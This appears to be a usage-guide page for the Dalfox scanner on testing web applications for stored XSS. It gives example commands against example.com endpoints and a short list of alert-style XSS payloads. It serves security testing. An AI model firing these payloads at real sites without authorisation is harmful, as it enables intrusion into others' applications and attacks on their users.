+++
title = "Stored XSS Testing"
description = "Learn how to test for stored (persistent) XSS vulnerabilities"
weight = 4
sort_by = "weight"

[extra]
+++

Stored (Persistent) XSS occurs when malicious input is saved and later executed when displayed to users.

## SXSS Mode

Dalfox tests stored XSS by injecting payloads and verifying them at a separate URL.

```bash
dalfox scan https://example.com/comment/submit \
  --sxss \
  --sxss-url https://example.com/comment/view?id=1 \
  --sxss-method GET
```

With POST data:
```bash
dalfox scan https://example.com/api/comment -X POST -d "comment=test&author=user" --sxss --sxss-url https://example.com/post/123 -p comment -p author
```

## Common Scenarios

**Blog Comments**:
```bash
dalfox scan https://blog.example.com/comment/add -X POST -d "name=John&comment=Great post!" --sxss --sxss-url https://blog.example.com/post/my-post -p name -p comment
```

**User Profile**:
```bash
dalfox scan https://example.com/api/profile -X PUT -H "Authorization: Bearer token" -d '{"displayName":"John","bio":"Dev"}' --sxss --sxss-url https://example.com/user/john -p displayName -p bio
```

**Product Review**:
```bash
dalfox scan https://shop.example.com/review/submit -X POST -d "product_id=42&review=Great&reviewer=John" --sxss --sxss-url https://shop.example.com/product/42 -p review
```

**Forum Post**:
```bash
dalfox scan https://forum.example.com/topic/create -X POST -H "Cookie: session=abc" -d "title=Topic&content=Content" --sxss --sxss-url https://forum.example.com/topic/latest -p title -p content
```

## Custom Payloads

**stored-payloads.txt:**
```html
<script>alert('Stored')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

```bash
dalfox scan https://example.com/comment -X POST -d "comment=test" --sxss --sxss-url https://example.com/comments --custom-payload stored-payloads.txt -p comment
```

## Testing Workflow

1. Identify storage points (comments, profiles, reviews)
2. Map where stored data appears
3. Test with `--sxss` flag
4. Verify manually in browser

## Common Targets

- User-generated content (comments, posts, reviews)
- Profile fields (name, bio, status)
- Metadata (titles, descriptions, captions)
- Administrative data (notifications, logs)

## Comprehensive Test

```bash
dalfox scan https://example.com/api/comment -X POST \
  -H "Authorization: Bearer token" \
  -d '{"post_id":123,"comment":"test"}' \
  --sxss --sxss-url https://example.com/post/123 \
  -p comment --custom-payload stored.txt \
  --remote-payloads portswigger,payloadbox \
  -e url,html,base64 -f json -o results.json
```

## See Also

- [Basic XSS Scanning](/usage_guides/basic_xss_scanning) - Standard XSS testing
- [Blind XSS Testing](/usage_guides/blind_xss_testing) - Out-of-band XSS
- [Scan Command](/sub-commands/scan) - Complete command reference
- [Custom Payloads](/usage_guides/custom_payloads) - Payload customization
